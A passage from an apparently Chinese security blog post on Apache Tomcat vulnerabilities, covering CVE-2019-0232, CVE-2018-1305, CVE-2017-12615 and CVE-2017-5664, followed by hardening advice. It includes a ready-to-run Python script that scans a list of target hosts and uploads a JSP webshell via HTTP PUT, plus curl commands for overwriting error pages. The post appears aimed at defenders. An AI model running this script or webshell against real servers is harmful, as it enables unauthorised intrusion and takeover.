--&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>cgi<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/cgi-bin/*<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#(2) hello.bat</span><br><span class=\"line\">@echo off</span><br><span class=\"line\">@REM:whatever the content in batch file</span><br><span class=\"line\">echo Content-Type: text/plain</span><br><span class=\"line\">echo.</span><br><span class=\"line\">set foo=%~1</span><br><span class=\"line\">%foo%</span><br></pre></td></tr></table></figure></p>\n<p>漏洞验证：本地测试验证如下<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190911113707.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>安全建议:</p>\n<ul>\n<li>版本排查:如果解压后的Tomcat目录名称被修改过或者通过<code>Windows Service Installer</code>方式安装，可使用软件自带的version模块来获取当前的版本。</li>\n</ul>\n<p>环境参考:<a href=\"https://github.com/pyn3rd/CVE-2019-0232\" target=\"_blank\" rel=\"noopener\">https://github.com/pyn3rd/CVE-2019-0232</a></p>\n<hr>\n\n<h4 id=\"0x08-CVE-2018-1305-权限绕过\"><a href=\"#0x08-CVE-2018-1305-权限绕过\" class=\"headerlink\" title=\"0x08 CVE-2018-1305(权限绕过)\"></a>0x08 CVE-2018-1305(权限绕过)</h4><p>描述:Java EE 提供了类似 ACL 权限检查的注解，可以直接用于修饰 Java Servlet，用于对 Servlet 进行 ACL 保护。<br>CVE编号:</p>\n<ul>\n<li>CVE-2018-1305</li>\n<li>CVE-2018-1304</li>\n</ul>\n<p>现假设有两个 Servlet：<br>  Servlet1，访问路径为 /servlet1/<em><br>  Servlet2，访问路径为 /servlet1/servlet2/</em></p>\n<p>Servlet1 上有如下图的 Security Constraint（简单理解就是 ACL）,Servlet2 上并没有 ACL。<br>然而因为 Servlet2 的访问 url 位于 Servlet1 的下一级（/servlet1/servlet2 是 /servlet1/ 的 “子目录”），所以 Tomcat 中正常的代码逻辑应该是，虽然 Servlet2 上面没有 ACL，但是 Servlet2 应该继承 Servlet1 的 ACL。</p>\n<p>正常情况应该是：<br>  先访问 /servlet1，返回 403，因为请求被 ACL 拦截了<br>  再访问 /servlet1/servlet2，返回 403，因为请求被 ACL 拦截</p>\n<p><em>那么实际的问题在哪里？</em><br>Tomcat 在接收到 Servlet 访问请求后，在实例化 Servlet 对象之前，会先扫描被访问的 Servlet 上注册的 ACL。如果存在 ACL，则将 ACL 规则添加到一个 Context 唯一的列表中。随后再检查当前访问的 Servlet 是否被 ACL 保护。</p>\n<ul>\n<li>ACL 扫描 org.apache.catalina.authenticator.AuthenticatorBase#invoke：</li>\n</ul>\n<p>实例流程:</p>\n<ul>\n<li>访问 <a href=\"http://localhost:8080/CVE-2018-1305/servlet1/servlet2，此时\" target=\"_blank\" rel=\"noopener\">http://localhost:8080/CVE-2018-1305/servlet1/servlet2，此时</a> servlet1 的 ACL 没被 Tomcat 加载，所以访问成功</li>\n<li>访问 <a href=\"http://localhost:8080/CVE-2018-1305/servlet1，被拒绝访问了，此时\" target=\"_blank\" rel=\"noopener\">http://localhost:8080/CVE-2018-1305/servlet1，被拒绝访问了，此时</a> Tomcat 加载了 servlet1 的 ACL</li>\n<li>再访问 <a href=\"http://localhost:8080/CVE-2018-1305/servlet1/servlet2，被拒绝访问了，因为\" target=\"_blank\" rel=\"noopener\">http://localhost:8080/CVE-2018-1305/servlet1/servlet2，被拒绝访问了，因为</a> Tomcat 已经加载了 servlet1 的 ACL</li>\n</ul>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190911161725.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<p><br></p>\n<h4 id=\"0x09-CVE-2017-12615-文件PUT上传\"><a href=\"#0x09-CVE-2017-12615-文件PUT上传\" class=\"headerlink\" title=\"0x09 CVE-2017-12615(文件PUT上传)\"></a>0x09 CVE-2017-12615(文件PUT上传)</h4><p>漏洞描述: 利用Tomcat允许PUT协议进行上传恶意的应用程序;<br>漏洞编号：CVE-2017-12615<br>影响平台：Windows&amp;Linux<br>影响版本：Apache Tomcat 7.0.0 - 7.0.81</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#! -*- coding:utf-8 -*- </span></span><br><span class=\"line\"><span class=\"keyword\">import</span> httplib</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> time,codecs</span><br><span class=\"line\"></span><br><span class=\"line\">UrlFile=file(<span class=\"string\">'./tomcatIP.txt'</span>) <span class=\"comment\">#url列表</span></span><br><span class=\"line\">fp= codecs.open(<span class=\"string\">\"./tomcat_success.txt\"</span>,<span class=\"string\">\"a\"</span>) <span class=\"comment\">#成功利用后写入的文件，支持写入中文字符的方式</span></span><br><span class=\"line\"></span><br><span class=\"line\">body = <span class=\"string\">'''&lt;%@ page language=\"java\" pageEncoding=\"gbk\"%&gt;&lt;jsp:directive.page import=\"java.io.File\"/&gt;&lt;jsp:directive.page import=\"java.io.OutputStream\"/&gt;&lt;jsp:directive.page import=\"java.io.FileOutputStream\"/&gt;&lt;% int i=0;String method=request.getParameter(\"act\");if(method!=null&amp;&amp;method.equals(\"yoco\"))&#123;String url=request.getParameter(\"url\");String text=request.getParameter(\"smart\");File f=new File(url);if(f.exists())&#123;f.delete();&#125;try&#123;OutputStream o=new FileOutputStream(f);o.write(text.getBytes());o.close();&#125;catch(Exception e)&#123;i++;%&gt;0&lt;%&#125;&#125;if(i==0)&#123;%&gt;1&lt;%&#125;%&gt;&lt;form action='?act=yoco' method='post'&gt;&lt;input size=\"100\" value=\"&lt;%=application.getRealPath(\"/\") %&gt;\" name=\"url\"&gt;&lt;br&gt;&lt;textarea rows=\"20\" cols=\"80\" name=\"smart\"&gt;'''</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">       <span class=\"keyword\">print</span> <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">       ----------------------------------------------------------------------------------------</span></span><br><span class=\"line\"><span class=\"string\">        程序名称：Tomcat put上传漏洞利用程序</span></span><br><span class=\"line\"><span class=\"string\">        漏洞编号：CVE-2017-12615</span></span><br><span class=\"line\"><span class=\"string\">        影响平台：Windows&amp;Linux</span></span><br><span class=\"line\"><span class=\"string\">        影响版本：Apache Tomcat 7.0.0 - 7.0.81</span></span><br><span class=\"line\"><span class=\"string\">        程序用法：</span></span><br><span class=\"line\"><span class=\"string\">       \\ttomcatIP.txt 里面设置需要扫描的IP地址，如:10.110.123.30:8080 回车后输入下一个IP地址</span></span><br><span class=\"line\"><span class=\"string\">       \\tpython tomcat_put.py</span></span><br><span class=\"line\"><span class=\"string\">       \\t成功会自动部署webshell 部署后访问 http://10.110.123.30:8080/test11.jsp</span></span><br><span class=\"line\"><span class=\"string\">       -----------------------------------------------------------------------------------------\\n'''</span></span><br><span class=\"line\">       urllist=[]</span><br><span class=\"line\">       <span class=\"keyword\">print</span> <span class=\"string\">\"\\ttomcat url list:\"</span>,</span><br><span class=\"line\">       <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">          line = UrlFile.readline()</span><br><span class=\"line\">          <span class=\"keyword\">if</span> len(line) == <span class=\"number\">0</span>: <span class=\"comment\"># Zero length indicates EOF</span></span><br><span class=\"line\">             <span class=\"keyword\">break</span></span><br><span class=\"line\">          line=line.strip()  <span class=\"comment\">#去除空格</span></span><br><span class=\"line\">          <span class=\"keyword\">print</span> line</span><br><span class=\"line\">          urllist.append(line)</span><br><span class=\"line\">       UrlFile.close()</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"keyword\">print</span> <span class=\"string\">'\\n'</span></span><br><span class=\"line\">       <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> urllist:</span><br><span class=\"line\">          conn = httplib.HTTPConnection(i)</span><br><span class=\"line\">          conn.request(method=<span class=\"string\">'OPTIONS'</span>, url=<span class=\"string\">'/ffffzz'</span>)</span><br><span class=\"line\">          headers = dict(conn.getresponse().getheaders())</span><br><span class=\"line\">          <span class=\"keyword\">if</span> <span class=\"string\">'allow'</span> <span class=\"keyword\">in</span> headers <span class=\"keyword\">and</span> \\</span><br><span class=\"line\">             headers[<span class=\"string\">'allow'</span>].find(<span class=\"string\">'PUT'</span>) &gt; <span class=\"number\">0</span> :</span><br><span class=\"line\">             conn.close()</span><br><span class=\"line\">             conn = httplib.HTTPConnection(i)</span><br><span class=\"line\">             url = <span class=\"string\">\"/\"</span> + <span class=\"string\">\"test11\"</span>+<span class=\"string\">'.jsp/'</span></span><br><span class=\"line\">             conn.request( method=<span class=\"string\">'PUT'</span>, url= url, body=body)</span><br><span class=\"line\">             res = conn.getresponse()</span><br><span class=\"line\">             <span class=\"keyword\">if</span> res.status  == <span class=\"number\">201</span> :</span><br><span class=\"line\">                <span class=\"keyword\">print</span> <span class=\"string\">'shell:'</span>, <span class=\"string\">'http://'</span> + sys.argv[<span class=\"number\">1</span>] + url[:<span class=\"number\">-7</span>]</span><br><span class=\"line\">                info=<span class=\"string\">'\\t[*]shell:'</span>+<span class=\"string\">'http://'</span> +i + url[:<span class=\"number\">-1</span>]+<span class=\"string\">\"\\n\"</span></span><br><span class=\"line\">                <span class=\"keyword\">print</span> info</span><br><span class=\"line\">                fp.write(info)</span><br><span class=\"line\">                fp.flush()</span><br><span class=\"line\">             <span class=\"keyword\">elif</span> res.status == <span class=\"number\">204</span> :</span><br><span class=\"line\">                info=<span class=\"string\">'http://'</span> +i + url[:<span class=\"number\">-1</span>]</span><br><span class=\"line\">                <span class=\"keyword\">print</span> <span class=\"string\">'[*]file exists! %s'</span> %info</span><br><span class=\"line\">             <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">print</span> <span class=\"string\">'\\t[*]error!'</span></span><br><span class=\"line\">             conn.close()</span><br><span class=\"line\">          <span class=\"keyword\">else</span>: </span><br><span class=\"line\">             <span class=\"keyword\">print</span> <span class=\"string\">'\\t[*]server not vulnerable!'</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception,e:</span><br><span class=\"line\">      <span class=\"keyword\">print</span> <span class=\"string\">'\\tError:'</span>, e</span><br></pre></td></tr></table></figure>\n<p><br></p>\n<h4 id=\"0x10-CVE-2017-5664-文件PUT上传\"><a href=\"#0x10-CVE-2017-5664-文件PUT上传\" class=\"headerlink\" title=\"0x10 CVE-2017-5664(文件PUT上传)\"></a>0x10 CVE-2017-5664(文件PUT上传)</h4><p>描述:这是一个比较鸡肋并且与PUT相关的一个漏洞(所以需要readOnly 为 false)涉及到 DefaultServlet(主要讲解)) 与 WebdavServlet。<br>触发要求：</p>\n<ul>\n<li>需要 DefaultServlet readonly 值为 false，默认为true。</li>\n<li>要求服务端配置了自定义的静态错误页面，而且客户端能够触发相应的错误来使请求被转发至错误页面。</li>\n</ul>\n<p><em>背景知识</em><br>DefaultServlet作用</p>\n<ul>\n<li>JspServlet 的作用是处理jsp 与jspx 文件的请求，那么非 jsp jspx 文件请求 就是由 DefaultServlet 来处理的（其实有别的情况）,这里简单地认为静态文件会交由DefaultServlet 来处理吧。</li>\n<li>DefaultServlet 可以处理 PUT 或 DELETE请求，前提要求是readOnly 为 false，然而默认值是 true。<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$vim</span> conf/web.xml</span><br><span class=\"line\"><span class=\"comment\">#开启了DefaultServlet 处理 PUT 请求的功能</span></span><br><span class=\"line\">&lt;init-param&gt;</span><br><span class=\"line\">  &lt;param-name&gt;<span class=\"built_in\">readonly</span>&lt;/param-name&gt;</span><br><span class=\"line\">  &lt;param-value&gt;<span class=\"literal\">false</span>&lt;/param-value&gt;</span><br><span class=\"line\">&lt;/init-param&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#自定义404 错误页面</span></span><br><span class=\"line\">&lt;error-page&gt;</span><br><span class=\"line\">  &lt;error-code&gt;404&lt;/error-code&gt;</span><br><span class=\"line\">  &lt;location&gt;/404.html&lt;/location&gt;</span><br><span class=\"line\">&lt;/error-page&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>利用案例:<br>1.请求必须到达DefaultServlet 才能进行 PUT 操作，这也就是说我们能上传的文件的类型是受限制的，比如默认情况下我们是不能上传jsp 或者jspx 的。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#本意是将 aaa.jsp PUT至目标服务器，保存为aaa.jsp</span></span><br><span class=\"line\">curl -i -T aaa.jsp http://localhost:8080/CVE-2017-5664/aaa.jsp</span><br></pre></td></tr></table></figure><br>但是请求将会被 JspServlet 处理，而不是被DefaultServlet 处理,而又JspServlet是不处理 PUT 请求的(将其转变成为PUT请求),但是此时我们可以上传静态文件<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#比如在readOnly 为 false 的时候通过如下命令上传aaa.txt</span></span><br><span class=\"line\">curl -i -T aaa.txt http://localhost:8080/CVE-2017-5664/aaa.txt</span><br></pre></td></tr></table></figure><br>因为以上请求会被 DefaultServlet 处理，所以PUT 操作会成功。</p>\n<p>2.利用思路<br>Java Servlet 规范中要求，当访问的资源出现如 404 或 500 之类的错误，并且同时服务端配置了相应的错误页面时，原始请求应该被forward 到错误页面。<br>如果 DefaultServlet 配置的readOnly 为 false，<code>·则一个恶意的请求有可能删除或者替换掉错误页面文件·</code>。</p>\n<p>如果给应用配置了一个自定义了 404.html 页面，如果原始请求错误就会被 forward 到 404.html 页面 , DefaultServlet 发现请求是一个 PUT 请求，所以直接利用从客户端传来的静态文件数据将/404.html 重写了。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#重写原始 404.html</span></span><br><span class=\"line\">Curl -i -T &lt;<span class=\"built_in\">echo</span> 404 modified&gt; http://localhost/poc.jsp</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#查看404.html的内容发现写入成功</span></span><br><span class=\"line\">cat 404.html</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#再次进行访问不存在的jsp文件</span></span><br><span class=\"line\">curl http://localhost/notFound.jsp</span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190916172727.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<hr>\n\n<h4 id=\"附录\"><a href=\"#附录\" class=\"headerlink\" title=\"附录\"></a>附录</h4><p><strong>Tomcat安全漏洞修改总结</strong><br>1.删除webapps目录中的docs、examples、host-manager、manager等正式环境用不着的目录，这一步就可以解决大部分漏洞。<br>方法是将%tocmat_home%/conf/Catalina/localhost目录下的manager.xml删除掉</p>\n<p><br></p>\n<p>2.解决”slow http denial of service attack”漏洞<br>原理：利用http-post的时候，指定一个非常大的content-length，然后以很低的速度发包，比如10-100s发一个字节，让这种连接不断开，这样当客户端连接多了后，占用了webserver的所有可用连接，从而导制DOS，属于一种打拒绝服务攻击。<br>解决方法：打开server.xml找到，将其中的connectionTimeout=”20000”改为8000，其单位为ms。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;Connector port&#x3D;&quot;8080&quot; protocol&#x3D;&quot;HTTP&#x2F;1.1&quot;</span><br><span class=\"line\">　　connectionTimeout&#x3D;&quot;20000&quot;</span><br><span class=\"line\">　　redirectPort&#x3D;&quot;8443&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<p>3.Tomcat版本的选择与安装注意事项<br>在安装时使用自定义的安装路径，并自定义WEB根目录。可以在Tomcat安装目录的conf目录下的server.xml中修改默认WEB根目录<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#在&lt;/Host&gt;之前加入类似以下内容：（重启生效）</span></span><br><span class=\"line\">&lt;Context path=<span class=\"string\">\"\"</span> docBase=<span class=\"string\">\"D:/javaweb\"</span> debug=<span class=\"string\">\"0\"</span> reloadable=<span class=\"string\">\"true\"</span> crossContext=<span class=\"string\">\"true\"</span> /&gt;</span><br></pre></td></tr></table></figure><br>上面语句的作用是设置Tomcat虚拟路径，path代表虚拟目录，可自定义，也可以为空，docBase代表物理路径<br>如果按上面的设置，当访问<a href=\"http://192.168.30.128:8080时实际访问的是D:\\javaweb目录下的文件。\">http://192.168.30.128:8080时实际访问的是D:\\javaweb目录下的文件。</a><br>如果path的值不为空，如设置为path=”java”时，那么访问时应该这样：<a href=\"http://192.168.30.128:8080/java。\" target=\"_blank\" rel=\"noopener\">http://192.168.30.128:8080/java。</a></p>\n<p><br></p>\n<p>4.Tomcat降权<br>在Windows环境下，Tomcat默认以System权限运行（如图11），这样的后果是一旦成功入侵WEB应用，将直接得到一个高权限的Webshell，并且不需要提权操作就可以完全控制服务器。<br>首先新建一个用户，设置复杂的密码，并且让它不属于任何用户组：<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910112116.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>接着打开“本地安全策略”—&gt;“本地策略”—&gt;“用户权限分配”，找到“作为服务登录”项，把刚刚新建的用户添加进去，如图13。<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910112126.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>然后打开“服务”组件，找到Tomcat的服务，右键“属性”—&gt;“登录”，用刚新建的tomcat账号运行Tomcat服务，如图14<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910112134.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>再找到Tomcat安装目录，只为“Administrators组”和“tomcat”账户分配完全控制权限，并将其他账户权限全部删除。<br>如果不为tomcat账户分配权限，Tomcat服务将无法启动，然后需要以最小权限原则为Tomcat日志目录和WEB目录单独分配权限，日志目录只需要分配“读取”和“写入”权限即可。<br>网站上传目录和数据库目录一般需要分配“写入”权限，但一定不要分配执行权限，其他目录一般只分配“读取”权限即可；<br>注：WEB目录权限分配可依据以下原则：有写入权限，一定不要分配执行权限；有执行权限，一定不要分配写入权限。<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910112147.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p><br></p>\n<p>5.Tomcat日志安全配置<br>在Tomcat上也是如此，它的日志默认保存在Tomcat安装目录的logs目录下，要注意的是Tomcat默认并没有开启访问日志，所以我们需要手工开启它。<br>打开server.xml<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910112208.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>然后修改日志的默认保存路径，并设置只允许系统管理员有日志保存目录的完全控制权限，tomcat账户有“读取”和“写入”权限即可，所示<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190910112219.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n","comments":true,"excerpt":"注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。","categories":[{"name":"安全测试","path":"api/categories/安全测试.json"}],"tags":[{"name":"Tomcat","path":"api/tags/Tomcat.json"}]}